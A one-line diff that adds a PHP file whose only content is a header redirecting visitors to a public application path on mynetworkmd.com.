@@ -1,0 +1,1 @@
+<?php header("Location: https://mynetworkmd.com/casos/public/"); ?>
